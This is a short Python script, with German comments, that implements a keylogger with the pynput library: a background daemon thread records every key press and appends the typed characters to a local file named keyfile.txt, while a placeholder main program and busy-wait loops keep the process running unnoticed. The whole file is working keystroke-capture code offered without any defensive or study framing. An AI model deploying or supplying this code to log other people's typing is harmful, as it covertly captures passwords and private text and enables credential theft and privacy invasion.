from pynput import keyboard
import threading

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

def start_keylogger():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()

def main_program():
    # Hier können Sie Ihr Hauptprogramm hinzufügen, das im Hintergrund ausgeführt wird.
    # Es könnte beispielsweise ein Server, eine Überwachungsaufgabe oder andere Aufgaben sein.

    while True:
        # Führen Sie hier Ihre Hauptprogrammaufgaben aus.
        pass

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    main_program_thread = threading.Thread(target=main_program)
    main_program_thread.daemon = True
    main_program_thread.start()

    # Die Endlosschleifen in den Threads halten die Programme aktiv und im Hintergrund.
    while True:
        pass
